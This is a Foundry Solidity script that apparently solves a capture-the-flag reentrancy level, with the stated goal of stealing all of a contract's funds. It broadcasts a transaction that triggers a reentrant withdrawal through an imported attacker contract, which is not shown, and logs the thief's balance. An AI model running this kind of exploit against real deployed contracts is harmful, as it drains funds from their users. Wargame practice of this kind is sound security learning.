// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;

import "../../lib/forge-std/src/Script.sol";
import {Reentrance} from "../src/L11__Reentrancy.sol";
import {L11_Caller__Reentrancy} from "../src/L11_Caller__Reentrancy.sol";

// The goal of this level is for you to steal all the funds from the contract.

contract L11_Solution__Reentrancy is Script {
    address public reentrancyAddress =
        0x7Cc8C16EC851C920d93F4CF3547620889b91f793;
    address public reentrancyCallerAddress =
        0xDFeAE79D8922abecE63Fa23a293A69b8B63b3a12;

    Reentrance public reentrancy = Reentrance(payable(reentrancyAddress));

    L11_Caller__Reentrancy public reentrancyCaller =
        L11_Caller__Reentrancy(payable(reentrancyCallerAddress));

    uint256 myBalance;

    function run() public {
        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");

        uint256 _reentranceBalance = reentrancyAddress.balance;
        console.log(_reentranceBalance);

        myBalance = reentrancy.balanceOf(reentrancyCallerAddress);
        console.log("Thief contract's prev balance: %s", myBalance);

        vm.startBroadcast(_robberPrivKey);

        reentrancyCaller.sendReentrantWithdraw();

        vm.stopBroadcast();

        myBalance = reentrancy.balanceOf(reentrancyCallerAddress);
        console.log("Thief contract's new balance: %s", myBalance);

        _reentranceBalance = reentrancyAddress.balance;
        console.log("Contract's balance: %s", _reentranceBalance);
    }
}
